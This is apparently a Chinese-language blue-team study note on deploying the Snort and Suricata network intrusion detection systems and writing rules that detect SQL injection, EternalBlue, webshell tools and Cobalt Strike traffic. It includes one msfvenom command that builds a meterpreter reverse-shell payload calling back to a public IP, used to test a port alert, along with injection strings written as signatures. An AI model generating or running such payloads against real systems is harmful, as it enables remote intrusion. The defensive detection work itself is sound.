# 蓝队技能-设备部署篇&NIDS入侵检测&Snort&Suricata&流量检测&特征提取&规则编写

```JAVA
IDS:入侵检测系统
基于主机的入侵检测系统（HIDS）–该系统将检查网络中计算机上的事件
基于网络的入侵检测系统（NIDS）–该系统将检查您网络上的流量恶意问题。

#NIDS-Snort
一个开源的网络入侵检测系统（IDS）和入侵防御系统（IPS），它可以捕获通讯流量并对其做协议解析，识别或防御通讯流量中可疑或恶意的行为。国内大部分厂商基于流量的IDS的数据包捕获、协议解析、检测引擎等关键模块都是在此基础上做修改和扩展优化。
参考：https://www.snort.org/
安装：https://mp.weixin.qq.com/s/haxqngjZBcrYs2QsQN7aqg
测试：
配置文件，规则写法，使用参数
https://www.cnblogs.com/yuersan/p/15236326.html
https://blog.csdn.net/hexf9632/article/details/94715434
https://blog.csdn.net/qq_43968080/article/details/103378952
自写规则：
1、ICMP协议流量警告
snort -i eth0 -c /etc/snort/snort.conf -A fast -l /var/log/snort
alert icmp any any -> any any (msg:"ICMP test"; gid:1;sid:10000001;rev:1;)
2、特定端口通讯警告
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.238.80.232 LPORT=7799 -f elf >7799.elf
my.rules
include $RULE_PATH/my.rules
snort -i eth0 -c /etc/snort/snort.conf -A fast -l /var/log/snort
alert tcp any 7799 -> any any (msg:"SNORT：visit destport tcp 7799";  sid:201900001; rev:1;)

编写Snort规则需要掌握一些基本技巧和方法，以下是几个关键点：
1. 使用适当的动作根据网络环境和安全需求选择合适的动作，如：
● alert：适用于需要立即采取行动的情况下。
● log：适用于需要记录流量但不采取其他行动的情况下。
● pass：适用于明确允许的流量，不进行检测。
2. 精确匹配协议和端口确保规则头中的协议和端口配置正确，以避免误报或漏报。
例如，对于HTTP流量，应明确指定tcp协议和80端口。
3. 合理使用内容匹配内容匹配是Snort规则的重要部分，使用content选项可以精确定位数据包中的特定内容。
需要注意的是，内容匹配应尽量精确，避免过多的模糊匹配，以减少误报率。
4. 定义唯一的规则ID每条规则必须有一个唯一的sid，以便于规则管理和事件关联。
推荐使用大于1000000的ID，以避免与Snort自带规则冲突。
5. 分类和优先级设置使用classtype和priority选项对规则进行分类和设置优先级，有助于事件管理和响应。
例如：classtype:attempted-recon; priority:2;

Snort规则由两部分组成：
规则头（Rule Header）和规则选项（Rule Options）。
规则头定义了流量匹配的基本信息，如协议、源和目的地址、端口等。规则选项则包含了更详细的检测条件和响应动作。
1. 规则头规则头的基本格式如下：<action> <protocol> <src_ip> <src_port> -> <dst_ip> <dst_port>其中，各个字段的含义如下：
● action：规则动作，常见的有alert（报警）、log（记录日志）、pass（通过）等。
● protocol：协议类型，如TCP、UDP、ICMP等。
● src_ip：源IP地址，可以是具体的IP，也可以是CIDR表示法的网段，还可以使用any表示任何地址。
● src_port：源端口号，可以是具体端口号，也可以使用any表示任何端口。
● dst_ip：目的IP地址，含义同src_ip。● dst_port：目的端口号，含义同src_port。
示例规则头：alert tcp any any -> 192.168.1.0/24 80
这条规则的意思是，当检测到任何源IP和源端口的TCP流量进入192.168.1.0/24网段的80端口时，触发报警。
2. 规则选项规则选项紧随规则头之后，由一系列键值对组成，使用分号分隔。其格式如下：<key>:<value>;常见的规则选项包括：
● msg：报警信息。● sid：规则ID，必须唯一。
● rev：规则版本号。
● content：匹配数据包中的内容。
● depth：指定从数据包开始的位置进行匹配。
● offset：指定匹配的起始位置。
● nocase：忽略大小写。
● classtype：分类类型，用于描述规则的性质。
示例规则选项：(msg:"Potential SQL Injection"; sid:1000001; rev:1; content:"' or '1'='1"; nocase;)
完整示例规则：alert tcp any any -> any 80 (msg:"Potential SQL Injection"; sid:1000001; rev:1; content:"' or '1'='1"; nocase;)
1、SQL注入攻击警告：
alert tcp any any -> any 80 (msg:"Possible SQL Injection"; content:"' OR 1=1 --"; http_uri; nocase; sid:10000000123; rev:1;)
2、永恒之蓝特征警告
alert smb any any -> $HOME_NET any (msg:“ET EXPLOIT Possible ETERNALBLUE MS17-010”; flow:to_server,established; content:”|00 00 00 31 ff|SMB|2b 00 00 00 00 18 07 c0|”; depth:16; fast_pattern; content:”|4a 6c 4a 6d 49 68 43 6c 42 73 72 00|”; distance:0; flowbits:set,ETPRO.ETERNALBLUE; flowbits:noalert; classtype:trojan-activity; sid:2024220; rev:1;)
3、结合后续流量分析
将sqlmap，冰蝎，哥斯拉，C2工具(CS等)，FRP等工具特征集合写好规则

#NIDS-Suricata
一个开源的网络入侵检测系统（IDS）和入侵防御系统（IPS），它可以捕获通讯流量并对其做协议解析，识别或防御通讯流量中可疑或恶意的行为。国内大部分厂商基于流量的IDS的数据包捕获、协议解析、检测引擎等关键模块都是在此基础上做修改和扩展优化。

项目：https://github.com/OISF/suricata
参考：https://suricata.readthedocs.io/
安装：https://docs.suricata.io/en/latest/install.html
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt-get update
sudo apt-get install suricata
配置：https://docs.suricata.io/en/latest/quickstart.html
ip addr
sudo vim /etc/suricata/suricata.yaml
修改网段，配置捕获
日志解析：
suricata.log ，包含 Suricata 运行时的日志信息，如启动、关闭、规则加载等，用于故障排除和监视。
stats.log，包含 Suricata 的统计信息，如流量统计、规则匹配统计等，，用于性能调优和网络活动分析。
fast.log，就是告警输出日志了，通常看这个就可以。
eve.json，详细的事件记录，以 JSON 格式呈现，包括有关规则匹配事件的详细信息，包括协议解析、源和目标地址、端口、负载数据等，用于深入分

测试开源规则：
1、检测冰蝎工具：Webshell
suricata -c /etc/suricata/suricata.yaml -i eth0 -s /etc/suricata/rules/Behinder3.rules
cat /var/log/suricata/fast.log
2、默认规则检测：漏扫流量
suricata -c /etc/suricata/suricata.yaml -i eth0 -s /etc/suricata/rules/suricata.rules
Suricata规则下载：
更新系统规则：suricata-update
http://47.108.150.136:8080/IDS
https://github.com/al0ne/suricata-rules
https://github.com/ptresearch/AttackDetection
https://mp.weixin.qq.com/s/VjWPSVzP0whafH-oCmmvLA
自写规则测试：
参考案例：https://mp.weixin.qq.com/s/iaztHJYAtQSCDUS0_5fgtQ
1、通达漏洞数据包：
suricata -c /etc/suricata/suricata.yaml -i eth0 -s /etc/suricata/rules/tongda.rules
alert http any any -> any any (msg:"通达OA-handle.php-SQL注入漏洞"; content:"share/handle.php"; http_uri; content:"select"; content:"and"; reference:url,http://example.com/2023-15672; classtype:web-application-attack; sid:20240908; rev:1;)
2、SQLMAP工具特征：
suricata -c /etc/suricata/suricata.yaml -i eth0 -s /etc/suricata/rules/sqlmap.rules
alert http any any -> any any (msg:"检测到哥斯拉连接"; http_header; content:"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8"; sid:1000001; rev:1;)
3、C2工具特征:
sslblacklist.rules：
alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"SSLBL: Malicious SSL certificate detected (CobaltStrike C&C)"; tls.fingerprint:"6e:ce:5e:ce:41:92:68:3d:2d:84:e2:5b:0b:a7:e0:4f:9c:b7:eb:7c"; reference:url, sslbl.abuse.ch/ssl-certificates/sha1/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c/; sid:902202003; rev:1;)

suricata.rules：
alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike"; flow:established,to_client; tls.cert_subject; bsize:25; content:"C=, ST=, L=, O=, OU=, CN="; endswith; fast_pattern; classtype:targeted-activity; sid:2023629; rev:7; metadata:affected_product Any, attack_target Client_Endpoint, created_at 2016_10_24, deployment Perimeter, performance_impact Low, signature_severity Major, updated_at 2024_03_27;)

#打包系统：securityonion
集成snort/suricata、bro(zeek)、elk、ossec等
https://securityonionsolutions.com/software

```

